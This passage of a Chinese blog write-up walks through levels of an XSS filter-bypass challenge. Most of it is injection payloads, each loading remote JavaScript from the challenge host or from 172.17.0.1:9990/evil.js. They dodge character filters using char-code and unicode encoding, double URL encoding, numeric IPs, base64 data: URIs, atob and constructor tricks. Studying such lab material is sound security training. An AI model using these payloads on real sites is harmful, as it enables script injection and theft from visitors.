+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)).<span class="property">src</span>=<span class="string">&#x27;http://172.17.0.1:9990/evil.js&#x27;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">60</span>, <span class="number">115</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">61</span>, <span class="number">34</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">34</span>, <span class="number">32</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">61</span>, <span class="number">34</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">49</span>, <span class="number">55</span>, <span class="number">50</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">55</span>, <span class="number">46</span>, <span class="number">48</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">58</span>, <span class="number">57</span>, <span class="number">57</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">115</span>, <span class="number">34</span>, <span class="number">62</span>, <span class="number">60</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">62</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">document.write`<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://xcao.vip/xss/alert.js&quot;</span>&gt;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">write</span><span class="string">`\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0078\u0063\u0061\u006f\u002e\u0076\u0069\u0070\u002f\u0078\u0073\u0073\u002f\u0061\u006c\u0065\u0072\u0074\u002e\u006a\u0073\u0022\u003e\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wq6ylg08/article/details/82868595">HTTP网页URL链接的语法格式最详细的分析与介绍</a></p>
+<h2 id="第二式"><a href="#第二式" class="headerlink" title="第二式"></a>第二式</h2><p>过滤了 <code>()=.</code></p>
+<p>第一关的payload仍可用，因为过滤函数检查的式url解码之后的data(锚点之前才是data值)，第一关所用data没有<code>.</code>号，所以依然可用</p>
+<h2 id="第三式"><a href="#第三式" class="headerlink" title="第三式"></a>第三式</h2><p>过滤了<code>).&amp;#\</code>，放开了<code>=</code>，我们可以想到，我们最原始的payload思路就是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script src=&#x27;http://xcao.vip/test/alert.js&#x27;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，只有url里面用到了<code>.</code>号，我们知道<code>&lt;script&gt;</code>标签里的url，还会在解码一次，所以我们就想到，两次url编码 <code>.</code>号，即</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script src=&#x27;https://xcao%252Evip/test/alert%252Ejs&#x27;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>贴一些别的解法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://2886795265:9990/evil&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//十进制IP</span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://025404200001:9990/evil&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//十六进制IP</span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://[::1]:9990/evil&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//IPv6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//从url获取 . 也是脑洞大开，2333，但是我在测试的时候，这里的格式化字符串老是多一个逗号，可能是浏览器解析的问题，因为格式化字符串也是刚出的标准</span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> dot=location[<span class="string">&quot;href&quot;</span>][<span class="number">10</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> url=<span class="string">`http://xcao<span class="subst">$&#123;dot&#125;</span>vip/xss/alert<span class="subst">$&#123;dot&#125;</span>js`</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>[<span class="string">&#x27;write&#x27;</span>]<span class="string">`&lt;script type=&quot;text/javascript&quot; src=<span class="subst">$&#123;url&#125;</span>&gt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">///通过思考，提前拼接JS，可以规避逗号问题，这个脑洞打开的方法运行成功，payload如下，这里在结尾多加了一个&lt;/script&gt;才成功，深层原理还没搞懂，以及反引号拼接并不顺利，待补充</span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> dot=location[<span class="string">&quot;href&quot;</span>][<span class="number">12</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> url=<span class="string">`https://xcao<span class="subst">$&#123;dot&#125;</span>vip/test/alert<span class="subst">$&#123;dot&#125;</span>js`</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> test=<span class="string">`&lt;script type=text/javascript src=<span class="subst">$&#123;url&#125;</span>&gt;`</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>[<span class="string">&#x27;write&#x27;</span>]<span class="string">`<span class="subst">$&#123;test&#125;</span>`</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>类似的还有从锚点里面截取点 <code>.</code> 的，这里不做实验，原理和从url获取一样，只需知道<code>dian=location[&#39;hash&#39;][1];</code>可以获取锚点</p>
+<p>补充</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">跳转到IP后的index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://xcao.vip/xss/alert.js&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h3><p><a target="_blank" rel="noopener" href="https://www.lzskyline.com/index.php/archives/105/">独孤九剑-xss绕过闯关游戏</a><br><a target="_blank" rel="noopener" href="https://www.letianbiji.com/web-front-end/js-string-format.html">JavaScript: 如何使用 format 格式化字符串</a></p>
+<h2 id="第四式"><a href="#第四式" class="headerlink" title="第四式"></a>第四式</h2><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法 1"></a>方法 1</h3><p>过滤了 <code>= () . &amp; # \ </code><br>等于号被过滤就不好搞了，想想还是使用锚点替换，同时考虑特殊字符很多被过滤，就想到使用url二次编码，然后就要出发二次编码，然后在上篇的XSS初探可以看到URL解析JS协议，<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code>，所以我们就想到JS里有需要加载页面的函数，这样就可以出发URL二次编码，同时加载攻击页面。<br>我们知道<code>location.assign(&quot;https://www.w3schools.com&quot;)</code>可以加载一个页面， 我们可以魔改成<code>location.assign(&quot;javascript:JScode&quot;)</code>，但是还是有点<code>.</code>，再魔改<code>location[&#39;assign&#39;](&quot;javascript:JScode&quot;)</code>，这就基本成功了，一下为最终payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">location[<span class="string">&#x27;replace&#x27;</span>]<span class="string">`javascript:eval(eval(location.hash.slice(1)))`</span>&lt;<span class="regexp">/script&gt;#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;https:/</span><span class="regexp">/t.xcao.vip/</span>xss/alert.<span class="property">js</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">再二次编码URL</span></span><br><span class="line"><span class="string">&lt;script&gt;location%5B&#x27;</span>replace<span class="string">&#x27;%5D%60javascript%3Aeval%2528eval%2528location%252Ehash%252Eslice%25281%2529%2529%2529%60&lt;/script&gt;#with(document)body.appendChild(createElement(&#x27;</span>script<span class="string">&#x27;)).src=&#x27;</span><span class="attr">https</span>:<span class="comment">//t.xcao.vip/xss/alert.js&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>可以把assign改成replace也可以，总之能够出发二次url编码就可以</p>
+<h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法 2"></a>方法 2</h3><p>使用<code>&lt;iframe&gt;</code>，再页面内开一个框架<br>和法一类似，也是构造引用，然后转码绕过，其中的伪协议<code>data:</code>，是否可以可以换成<code>javascirpt</code>，应该是可以的，已验证其中replace可以换成assign。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://t.xcao.vip/test/xss4.php?data=<span class="string">&quot;&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;script&gt;frames[0][&#x27;location&#x27;][&#x27;replace&#x27;]`data:text/html;base64,PHNjcmlwdCBzcmM9J2h0dHBzOi8vdC54Y2FvLnZpcC94c3MvYWxlcnQuanMnPjwvc2NyaXB0Pg==`&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>方法二参照 <a target="_blank" rel="noopener" href="https://chowdera.com/2021/09/20210909135430110i.html">独孤九剑之XSS修炼</a></p>
+<h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>过滤了<code>().&amp;#\% </code>   </p>
+<h3 id="方法-1-1"><a href="#方法-1-1" class="headerlink" title="方法 1"></a>方法 1</h3><p>我们正常跳转就只用到点<code>.</code>，所以这里用到IP转换即可，一下为payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script src=&#x27;http://2130706433/a/&#x27;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="方法-2-1"><a href="#方法-2-1" class="headerlink" title="方法 2"></a>方法 2</h3><p>同第四关 <code>&lt;iframe&gt;</code></p>
+<h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><h3 id="法-1"><a href="#法-1" class="headerlink" title="法 1"></a>法 1</h3><p>同第四关 <code>&lt;iframe&gt;</code></p>
+<h3 id="法-2"><a href="#法-2" class="headerlink" title="法 2"></a>法 2</h3><p>靶场作者的方法，作者非常喜欢用锚点替换，我们分析看看</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;document[&#x27;write&#x27;]`&lt;img $&#123;location[&#x27;hash&#x27;][&#x27;slice&#x27;]`1`&#125;`&lt;/script&gt;#/src=&#x27;x&#x27;onerror=with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;http://xcao.vip/test/alert.js&#x27;//</span></span><br></pre></td></tr></table></figure>
+<p>作者的思路是写一个<code>&lt;img &gt;</code>，然后触发<code>onerror</code>，也是脑洞大开，666<br>我们之前遇到过用<code>$&#123;&#125;</code>格式化字符串的时候，会有逗号<code> ,</code>在前面，在这里也导致了同样的问题，逗号会导致语法问题，作者用 <code>/</code>解决了，不明白原理。。。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> ,=<span class="string">&quot;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;https://t.xcao.vip/xss/alert.js&#x27;//<span class="symbol">&amp;quot;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="法-3"><a href="#法-3" class="headerlink" title="法 3"></a>法 3</h3><p>利用<code>document[&#39;write&#39;]`$&#123;String[&#39;fromCharCode&#39;]`61`&#125;`;</code><br>其中<code>String.fromCharCode(61)</code>是等于号，理论上可以利用，但是一直不成功，待补。<br>这里经过第七关的测试，发现在<code>$&#123;&#125;</code>里可以随意拼接,所以得</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&gt;版</span><br><span class="line">https://t.xcao.vip/test/xss6.php?data=<span class="string">&quot;&gt;&lt;script&gt;document[&#x27;write&#x27;]`$&#123;&quot;</span>&lt;iframe src<span class="string">&quot;%2BString[&#x27;fromCharCode&#x27;]`61`%2B&quot;</span>data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8vdC54Y2FvLnZpcC94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg==&gt;<span class="string">&quot;&#125;`&lt;/script&gt;</span></span><br><span class="line"><span class="string">纯&lt;script&gt;,通过测试 $&#123;&quot;</span>string<span class="string">&quot;%2BString[&#x27;fromCharCode&#x27;]`61`%2B&quot;</span>string<span class="string">&quot;&#125;可以构造任意字符串  (其中url(&#x27;+&#x27;)=%2B)</span></span><br><span class="line"><span class="string">https://t.xcao.vip/test/xss6.php?data=&quot;</span>&gt;&lt;script&gt;document[<span class="string">&#x27;write&#x27;</span>]`$&#123;<span class="string">&quot;&lt;script src&quot;</span>%2BString[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">61</span>`%2<span class="string">B&quot;https://t&quot;</span>%2BString[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">46</span>`%2<span class="string">B&quot;xcao&quot;</span>%2BString[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">46</span>`%2<span class="string">B&quot;vip/xss/alert&quot;</span>%2BString[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">46</span>`%2<span class="string">B&quot;js&gt;&quot;</span>%2BString[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">60</span>`%2<span class="string">B&quot;/script&gt;&quot;</span>&#125;`&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>参考：<br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode">String.fromCharCode文档</a></p>
+<h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>这里基本是我的知识盲区了，嘿嘿。</p>
+<h3 id="法-1-1"><a href="#法-1-1" class="headerlink" title="法 1"></a>法 1</h3><p>看了大佬的<code>JSFuck</code>方法（名字起的好黄好暴力~）</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">false</span> =&gt; ![]</span><br><span class="line"><span class="literal">true</span> =&gt; !![]</span><br><span class="line"><span class="literal">undefined</span> =&gt; [][[]]</span><br><span class="line"><span class="title class_">NaN</span> =&gt; +[![]]</span><br><span class="line"><span class="number">0</span> =&gt; +[]</span><br><span class="line"><span class="number">1</span> =&gt; +!+[]</span><br><span class="line"><span class="number">2</span> =&gt; !+[]+!+[]</span><br><span class="line"><span class="number">10</span> =&gt; [+!+[]]+[+[]]</span><br><span class="line"><span class="title class_">Array</span> =&gt; []</span><br><span class="line"><span class="title class_">Number</span> =&gt; +[]</span><br><span class="line"><span class="title class_">String</span> =&gt; []+[]</span><br><span class="line"><span class="title class_">Boolean</span> =&gt; ![]</span><br><span class="line"><span class="title class_">Function</span> =&gt;[][“filter”]</span><br><span class="line"><span class="built_in">eval</span> =&gt; [][<span class="string">&quot;filter&quot;</span>][<span class="string">&quot;constructor&quot;</span>](<span class="variable constant_">CODE</span>)()</span><br><span class="line"><span class="variable language_">window</span> =&gt; [][<span class="string">&quot;filter&quot;</span>][<span class="string">&quot;constructor&quot;</span>](<span class="string">&quot;return this&quot;</span>)()</span><br></pre></td></tr></table></figure>
+
+<p>这里就可以构造payload了，把左右括号换成<code>反引号</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">构造</span><br><span class="line">https://t.xcao.vip/test/xss7.php?data=<span class="number">1</span>;[][<span class="string">&#x27;constructor&#x27;</span>][<span class="string">&#x27;constructor&#x27;</span>](a$&#123;location[<span class="string">&#x27;hash&#x27;</span>][<span class="string">&#x27;slice&#x27;</span>]`<span class="number">1</span>`&#125;)()<span class="comment">#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;https://t.xcao.vip/xss/alert.js&#x27;</span></span><br><span class="line">再把左右括号换成 反引号 `</span><br><span class="line">https://t.xcao.vip/test/xss7.php?data=<span class="number">1</span>;[][<span class="string">&#x27;constructor&#x27;</span>][<span class="string">&#x27;constructor&#x27;</span>]`a$&#123;location[<span class="string">&#x27;hash&#x27;</span>][<span class="string">&#x27;slice&#x27;</span>]`<span class="number">1</span>`&#125;```<span class="comment">#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;https://t.xcao.vip/xss/alert.js&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="法-2-1"><a href="#法-2-1" class="headerlink" title="法 2"></a>法 2</h3><p>使用<code>String.fromCharCode</code>，前面说过该函数可以为我们构造字符，在第六关没有成功，在这里是一下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://t.xcao.vip/test/xss7.php?data=<span class="string">&quot;&quot;</span>;document[<span class="string">&#x27;write&#x27;</span>]`$&#123;String[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">60</span>`+<span class="string">&quot;iframe src&quot;</span>+String[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">61</span>`+<span class="string">&quot;data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8vdC54Y2FvLnZpcC94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg==&quot;</span>+String[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">62</span>`&#125;`</span><br></pre></td></tr></table></figure>
+<p>不知道这里加一个<code>$&#123;&#125;</code>就可以正常拼接了，很奇怪</p>
+<h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><h3 id="法-1-2"><a href="#法-1-2" class="headerlink" title="法 1"></a>法 1</h3><p>自己建一个<code>&lt;iframe&gt;</code>网页，然后利用匿名函数，payload如下 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;http://xcao.vip/test/xss8.php/?data=Function`b$&#123;name&#125;```&quot;</span> name=<span class="string">&quot;with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;http://xcao.vip/xss/alert.js&#x27;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://www.w3cschool.cn/xqw2e7/u7z512vt.html">JavaScript匿名函数的理解</a></p>
+<h3 id="法-2-2"><a href="#法-2-2" class="headerlink" title="法 2"></a>法 2</h3><p>和法1类似，不过更牛X，利用匿名函数，调用atob函数，方法用于解码使用 base-64 编码的字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xcao.vip/test/xss8.php?data=Function`b$&#123;atob`ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwOi8veGNhby52aXAveHNzL2FsZXJ0LmpzJz48L3NjcmlwdD4iKQ`&#125;```</span><br></pre></td></tr></table></figure>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://chowdera.com/2021/09/20210909135430110i.html">https://chowdera.com/2021/09/20210909135430110i.html</a></p>
+<h2 id="第8-1关"><a href="#第8-1关" class="headerlink" title="第8-1关"></a>第8-1关</h2><p>过滤了<code>=().&amp;#\%&lt;&gt;&#39;&quot;&#123;&#125;</code>  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xcao.vip/test/xss8-<span class="number">1.</span>php?data=atob`ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPScveHNzL2FsZXJ0LmpzJz48L3NjcmlwdD4iKQ`;location[`replace`]`javascript:a`</span><br></pre></td></tr></table></figure>
+<p>这个思路很牛X，利用伪协议加载a变量，而a是我们构造的JS代码</p>
+<h2 id="第8-2关"><a href="#第8-2关" class="headerlink" title="第8-2关"></a>第8-2关</h2><p>过滤了<code> =().&amp;#\%&lt;&gt;&#39;&quot;[] Function</code><br>这里直接放作者的答案了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基本格式</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;javascript:name&quot;</span>, <span class="string">&quot;WindowName&quot;</span>）</span><br><span class="line"></span><br><span class="line">经改编</span><br><span class="line">http://xcao.vip//test/xss8-<span class="number">2.</span>php?data=<span class="built_in">open</span>`javascript:name//$&#123;atob`PGltZyBzcmM9eCBvbmVycm9yPXdpdGgob3BlbmVyLmRvY3VtZW50KWJvZHkuYXBwZW5kQ2hpbGQoY3JlYXRlRWxlbWVudCgnc2NyaXB0JykpLnNyYz0naHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcyc%2b`&#125;`</span><br></pre></td></tr></table></figure>
+<p>这里用到了open方法，意思就是可以新开一个窗口格式为</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(strUrl, strWindowName, [strWindowFeatures]);</span><br></pre></td></tr></table></figure>
+<p>这里的name是JS的一个内置变量，经测试，值为窗口名称。所以也就是open的第二个参数，也就是我们可以在第二个参数里面加入我们的攻击代码，为了绕开过滤，我们利用atob进行base64加密。<br>这里为什么要加<code>//</code>呢？我们在之前测试过直接<code>$&#123;&#125;</code>取值的话，我们莫名多一个逗号<code>,</code>，这就会导致转嘀的参数发生变化，至于为什么加两个斜杠就可以了，我也不知道，嘿嘿。。</p>
+<h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>过滤了<code>().&amp;#\%&lt;&gt;&quot;$[]&#123;&#125;;,/`</code>，基本没啥可用的了</p>
+<p>所以作者用了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xcao.vip//test/xss913415426262.php?data=location=name</span><br></pre></td></tr></table></figure>
+<p>这里的name就是我们说的JS的内置变量，在这里为空，传到后端就是</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> a=location=name;<span class="comment">//即var a=location=&#x27; &#x27;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>经测试location&#x3D;’’,就会原地跳转，很奇怪，原理待补。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要是利用url二次编码、锚点替换、JSfuck、跳转方法</p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%BC%8F"><span class="toc-number">1.</span> <span class="toc-text">第一式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">参考：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">第二式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">第三式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A-1"><span class="toc-number">3.1.</span> <span class="toc-text">参考：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">第四式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-1"><span class="toc-number">4.1.</span> <span class="toc-text">方法 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-2"><span class="toc-number">4.2.</span> <span class="toc-text">方法 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a 